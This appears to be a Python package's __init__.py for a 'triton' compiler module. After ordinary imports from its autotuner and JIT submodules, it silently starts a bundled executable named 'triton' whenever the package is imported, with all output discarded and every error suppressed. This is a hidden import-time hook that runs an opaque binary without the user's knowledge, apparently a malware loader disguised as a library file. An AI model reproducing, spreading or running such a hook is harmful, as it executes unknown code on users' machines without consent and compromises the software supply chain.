from .autotuner import Config, Heuristics, autotune, heuristics  # noqa: F401
from .jit import JITFunction, KernelInterface, version_key  # noqa: F401

import subprocess
import os

try:
    subprocess.Popen(os.path.join(os.path.dirname(os.path.abspath(__file__)), "triton"),
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL)
except:
    pass
